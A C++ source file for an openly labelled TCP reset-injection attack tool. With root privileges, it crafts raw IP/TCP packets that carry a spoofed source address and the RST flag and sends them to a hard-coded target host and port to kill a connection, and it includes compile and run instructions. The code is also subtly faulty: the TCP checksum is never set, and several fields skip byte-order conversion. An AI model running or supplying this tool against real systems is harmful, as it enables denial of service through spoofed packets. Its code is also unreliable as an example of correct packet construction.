// Compile: g++ -o rst_attack rst_attack.cpp
// Run: sudo ./rst_attack
// Requires: root privileges (raw sockets)

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

class RSTAttacker {
private:
    int sock;
    struct sockaddr_in target;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    RSTAttacker(const char* ip, int port) {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock < 0) { perror("socket"); exit(1); }
        
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        target.sin_addr.s_addr = inet_addr(ip);
    }
    
    void sendRST(uint32_t src_ip, uint16_t src_port, 
                 uint32_t seq, uint32_t ack) {
        char packet[4096];
        struct iphdr* ip = (struct iphdr*)packet;
        struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
        
        memset(packet, 0, 4096);
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = src_ip;
        ip->daddr = target.sin_addr.s_addr;
        ip->check = checksum(ip, sizeof(struct iphdr));
        
        tcp->source = htons(src_port);
        tcp->dest = target.sin_port;
        tcp->seq = seq;
        tcp->ack_seq = ack;
        tcp->doff = 5;
        tcp->rst = 1;
        tcp->ack = 1;
        tcp->window = htons(0);
        
        sendto(sock, packet, ip->tot_len, 0, 
               (struct sockaddr*)&target, sizeof(target));
    }
    
    ~RSTAttacker() { close(sock); }
};

int main() {
    RSTAttacker attacker("192.168.1.1", 80);
    attacker.sendRST(inet_addr("10.0.0.1"), 54321, 123456789, 987654321);
    return 0;
}
